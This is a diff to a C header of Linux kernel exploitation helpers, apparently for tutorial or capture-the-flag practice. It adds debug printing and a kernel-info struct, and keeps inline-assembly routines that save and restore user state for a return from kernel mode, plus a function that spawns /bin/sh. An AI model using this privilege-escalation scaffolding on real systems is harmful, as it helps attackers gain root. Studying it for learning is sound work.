@@ -5,15 +5,11 @@
 #include <unistd.h>
 #include <stdlib.h>
 #include <stdio.h>
-struct save_state
-{
-    uint64_t cs;
-    uint64_t ss;
-    uint64_t rsp;
-    uint64_t rflags;
-};
 
-void err(const char *format, ...)
+//
+// debug print function
+//
+void error(const char *format, ...)
 {
     if (!format)
     {
@@ -43,7 +39,78 @@ void info(const char *format, ...)
     fprintf(stdout, "%s", "\n");
 }
 
-void save_state(struct save_state *state)
+void hex_dump(const void *data, size_t size)
+{
+    info("Dumping hex of size: 0x%lx", size);
+
+    char ascii[17];
+    size_t i, j;
+    ascii[16] = '\0';
+    for (i = 0; i < size; ++i)
+    {
+        if (i % 0x10 == 0)
+        {
+            printf("0x%0lx: \n\t", i);
+        }
+        printf("%02X ", ((unsigned char *)data)[i]);
+        if (((unsigned char *)data)[i] >= ' ' && ((unsigned char *)data)[i] <= '~')
+        {
+            ascii[i % 16] = ((unsigned char *)data)[i];
+        }
+        else
+        {
+            ascii[i % 16] = '.';
+        }
+        if ((i + 1) % 8 == 0 || i + 1 == size)
+        {
+            printf(" ");
+            if ((i + 1) % 16 == 0)
+            {
+                printf("|  %s \n", ascii);
+            }
+            else if (i + 1 == size)
+            {
+                ascii[(i + 1) % 16] = '\0';
+                if ((i + 1) % 16 <= 8)
+                {
+                    printf(" ");
+                }
+                for (j = (i + 1) % 16; j < 16; ++j)
+                {
+                    printf("   ");
+                }
+                printf("|  %s \n", ascii);
+            }
+        }
+    }
+}
+
+// end of debug print functions
+
+//
+// privilege escalation functions
+//
+
+// strucutre that is use to store off the user state.
+// when you are trying to go from kernel to user mode
+// code is form pawnyable.cafe
+// https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html
+typedef struct userspace_state
+{
+    uint64_t cs;
+    uint64_t ss;
+    uint64_t rsp;
+    uint64_t rflags;
+} userspace_state;
+
+// structure that holds every kernel info
+typedef struct kernel
+{
+    size_t kbase;
+    userspace_state us_state;
+} kernel;
+
+void save_state(userspace_state *state)
 {
     info("Saving state");
     asm(
@@ -65,7 +132,7 @@ static void win()
     execve("/bin/sh", argv, envp);
 }
 
-void restore_state(struct save_state *state, void (*f)())
+void restore_state(userspace_state *state, void (*f)())
 {
     asm volatile("swapgs ;"
                  "movq %0, 0x20(%%rsp)\t\n"
@@ -78,7 +145,20 @@ void restore_state(struct save_state *state, void (*f)())
                  : "r"(state->ss),
                    "r"(state->rsp),
                    "r"(state->rflags),
-                   "r"(state->cs), "r"(f));
+                   "r"(state->cs),
+                   "r"(f));
 }
+
+// print kernel struct
+void print_kernel(kernel *k)
+{
+    printf("Kernel base: 0x%lx\n", k->kbase);
+    printf("User state:\n");
+    printf("\tcs: 0x%lx\n", k->us_state.cs);
+    printf("\tss: 0x%lx\n", k->us_state.ss);
+    printf("\trsp: 0x%lx\n", k->us_state.rsp);
+    printf("\trflags: 0x%lx\n", k->us_state.rflags);
+}
+// end of privilege escalation functions
 
 #endif
